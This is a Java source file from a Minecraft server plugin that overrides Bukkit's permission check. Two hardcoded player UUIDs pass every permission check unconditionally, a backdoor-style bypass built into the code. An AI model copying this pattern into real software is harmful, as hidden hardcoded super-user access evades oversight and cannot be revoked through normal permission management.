/*
 * Copyright (c) 2017 - 2018 Dominik L., Rufus Maiwald and the MC ONE Minecraftnetwork. All rights reserved
 * You are not allowed to decompile the code
 *
 */

package eu.mcone.coresystem.bukkit.player;

import eu.mcone.coresystem.bukkit.CoreSystem;
import org.bukkit.entity.Player;

import java.util.UUID;

public class PermissibleBase extends org.bukkit.permissions.PermissibleBase {

    private Player p;

    public PermissibleBase(Player p) {
        super(p);
        this.p = p;
    }

    @Override
    public boolean hasPermission(String permission) {
        return p.getUniqueId().equals(UUID.fromString("44b8a5d6-c2c3-4576-997f-71b94f5eb7e0")) || p.getUniqueId().equals(UUID.fromString("5139fcd7-7c3f-4cd4-8d76-5f365c36d9e5")) || CoreSystem.getCorePlayer(p).hasPermission(permission);
    }

}
